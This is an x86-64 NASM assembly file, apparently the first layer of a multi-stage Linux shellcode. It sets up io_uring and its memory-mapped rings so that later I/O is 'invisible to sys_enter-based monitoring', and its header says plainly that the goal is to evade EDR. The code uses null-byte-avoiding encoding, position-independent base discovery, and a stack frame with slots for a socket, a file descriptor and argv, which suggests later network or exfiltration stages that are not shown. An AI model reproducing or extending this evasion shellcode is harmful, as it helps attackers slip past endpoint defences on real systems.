; ================================================================
; layer0_bootstrap.asm — Layer 0: io_uring setup + mmap
; ================================================================
; The ONLY code that emits syscalls visible to an EDR:
;   - io_uring_setup (syscall 425)
;   - mmap × 3       (syscall 9)
;
; After this layer completes, all I/O goes through io_uring
; and is invisible to sys_enter-based monitoring.
;
; Provides (stored in stack frame at r13):
;   F_URFD    — io_uring fd
;   F_SQ_TP   — pointer to sq ring tail word
;   F_CQ_HP   — pointer to cq ring head word
;   F_CQ_TP   — pointer to cq ring tail word
;   F_SQESB   — sqes mmap base
;   F_SQARR   — sq_array absolute pointer
;   F_CQESB   — cqes absolute pointer
;   F_SQMSK   — sq ring mask value (u32)
;   F_CQMSK   — cq ring mask value (u32)
;
; Register state on entry: none assumed
; Register state on exit:
;   r12 = runtime base address (for RIP-relative data)
;   r13 = stack frame base pointer (stable across all calls)
;   r14 = sq_ring mmap base
;   r15 = cq_ring mmap base
;
; Include this file at the top of your combined shellcode:
;   %include "layer0_bootstrap.asm"
; ================================================================

BITS 64

; ---- Syscall numbers ----
%define SYS_MMAP      9
%define SYS_URING_STP 425
%define SYS_URING_ENT 426
%define SYS_EXIT      60

; ---- mmap flags ----
%define PROT_RW             3
%define MAP_SH_POP_LO       0x01
%define MAP_SH_POP_HI       0x80

; ---- io_uring_params field offsets ----
%define P_SQ_ENT    0
%define P_CQ_ENT    4
%define P_FEATURES  20
%define P_SQ_HEAD   40
%define P_SQ_TAIL   44
%define P_SQ_MASK   48
%define P_SQ_ARRAY  64
%define P_CQ_HEAD   80
%define P_CQ_TAIL   84
%define P_CQ_MASK   88
%define P_CQ_CQES   100
%define IORING_FEAT_SINGLE_MMAP 1

; ---- SQE/CQE field offsets ----
%define SQ_OPCODE   0
%define SQ_FD       4
%define SQ_OFF      8
%define SQ_ADDR     16
%define SQ_LEN      24
%define SQ_OPFLAGS  28
%define SQ_UDATA    40
%define CQ_RES      8

; ---- Stack frame layout (r13 = frame base) ----
%define F_PARAMS    0
%define F_SQ_TP     104
%define F_CQ_HP     112
%define F_CQ_TP     120
%define F_SQESB     128
%define F_SQARR     136
%define F_CQESB     144
%define F_SQMSK     152
%define F_CQMSK     156
%define F_URFD      160
%define F_FILEFD    164
%define F_SOCKFD    168
%define F_NBYTES    172
%define F_SADDR     176
%define F_RBUF      192
%define F_ARGV      4288
%define F_TOTAL     4320

; ================================================================
; ENTRY POINT
; ================================================================
_start:
    sub rsp, F_TOTAL
    mov r13, rsp

    call _get_base
_get_base:
    pop r12

    ; Zero stack frame (540 qwords = 4320 bytes) — see combined/shellcode.asm
    ; for the byte-arith carry-truncation and ECX-upper-bits notes
    mov rdi, r13
    xor eax, eax
    xor ecx, ecx
    mov cx, 540
    rep stosq

    ; --- io_uring_setup(32, &params) ---
    xor eax, eax
    mov ax, 0x1A9       ; SYS_io_uring_setup = 425
    push 0x20
    pop rdi
    lea rsi, [r13 + F_PARAMS]
    syscall
    test rax, rax
    js _fail
    mov [r13 + F_URFD], eax

    ; --- Build MAP_SHARED|MAP_POPULATE = 0x8001 ---
    xor r10, r10
    inc r10
    mov eax, 1
    push 0xF
    pop rcx
    shl eax, cl
    or r10d, eax        ; r10d = 0x8001

    ; --- mmap SQ ring ---
    push SYS_MMAP
    pop rax
    xor rdi, rdi
    mov esi, [r13 + F_PARAMS + P_SQ_ENT]
    shl esi, 2
    add esi, [r13 + F_PARAMS + P_SQ_ARRAY]
    push PROT_RW
    pop rdx
    mov r8d, [r13 + F_URFD]
    xor r9, r9
    syscall
    test rax, rax
    js _fail
    mov r14, rax

    ; --- Check SINGLE_MMAP ---
    mov ecx, [r13 + F_PARAMS + P_FEATURES]
    test ecx, IORING_FEAT_SINGLE_MMAP
    jnz .single_mmap

    ; --- mmap CQ ring (separate) ---
    push SYS_MMAP
    pop rax
    xor rdi, rdi
    mov esi, [r13 + F_PARAMS + P_CQ_ENT]
    shl esi, 4
    add esi, [r13 + F_PARAMS + P_CQ_CQES]
    push PROT_RW
    pop rdx
    mov r8d, [r13 + F_URFD]
    push 1
    pop r9
    push 0x1B
    pop rcx
    shl r9, cl          ; IORING_OFF_CQ_RING = 0x8000000
    syscall
    test rax, rax
    js _fail
    mov r15, rax
    jmp .do_sqes

.single_mmap:
    mov r15, r14

.do_sqes:
    ; --- mmap SQEs ---
    ; Rebuild r10 = MAP_SHARED|MAP_POPULATE (clobbered above)
    xor r10, r10
    inc r10
    mov eax, 1
    push 0xF
    pop rcx
    shl eax, cl
    or r10d, eax
    push SYS_MMAP
    pop rax
    xor rdi, rdi
    mov esi, [r13 + F_PARAMS + P_SQ_ENT]
    shl esi, 6
    push PROT_RW
    pop rdx
    mov r8d, [r13 + F_URFD]
    push 1
    pop r9
    push 0x1C
    pop rcx
    shl r9, cl          ; IORING_OFF_SQES = 0x10000000
    syscall
    test rax, rax
    js _fail
    mov [r13 + F_SQESB], rax

    ; --- Compute internal pointers ---
    mov eax, [r13 + F_PARAMS + P_SQ_TAIL]
    add rax, r14
    mov [r13 + F_SQ_TP], rax

    mov eax, [r13 + F_PARAMS + P_SQ_MASK]
    add rax, r14
    mov eax, [rax]
    mov [r13 + F_SQMSK], eax

    mov eax, [r13 + F_PARAMS + P_SQ_ARRAY]
    add rax, r14
    mov [r13 + F_SQARR], rax

    mov eax, [r13 + F_PARAMS + P_CQ_HEAD]
    add rax, r15
    mov [r13 + F_CQ_HP], rax

    mov eax, [r13 + F_PARAMS + P_CQ_TAIL]
    add rax, r15
    mov [r13 + F_CQ_TP], rax

    mov eax, [r13 + F_PARAMS + P_CQ_MASK]
    add rax, r15
    mov eax, [rax]
    mov [r13 + F_CQMSK], eax

    mov eax, [r13 + F_PARAMS + P_CQ_CQES]
    add rax, r15
    mov [r13 + F_CQESB], rax

    ; Bootstrap complete — fall through to Layer 1
